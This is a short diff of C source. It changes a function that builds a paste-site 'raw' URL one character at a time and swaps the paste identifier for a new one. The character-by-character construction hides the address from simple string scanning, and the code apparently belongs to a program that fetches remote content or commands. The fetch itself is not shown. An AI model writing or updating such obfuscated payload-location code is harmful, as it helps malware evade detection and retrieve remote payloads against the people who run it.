@@ -470,8 +470,8 @@ void _url(char *buf) {
     buf[10] = 's'; buf[11] = 't'; buf[12] = 'e'; buf[13] = 'b'; buf[14] = 'i'; 
     buf[15] = 'n'; buf[16] = '.'; buf[17] = 'c'; buf[18] = 'o'; buf[19] = 'm';
     buf[20] = '/'; buf[21] = 'r'; buf[22] = 'a'; buf[23] = 'w'; buf[24] = '/';
-    buf[25] = 'f'; buf[26] = 'u'; buf[27] = 'c'; buf[28] = 'K'; buf[29] = 'k';
-    buf[30] = 'O'; buf[31] = 'f'; buf[32] = 'f';
+    buf[25] = 'I'; buf[26] = 'r'; buf[27] = 'q'; buf[28] = 'S'; buf[29] = 't';
+    buf[30] = 'O'; buf[31] = 'r'; buf[32] = 'M';
     buf[33] = '\0';
 }
 
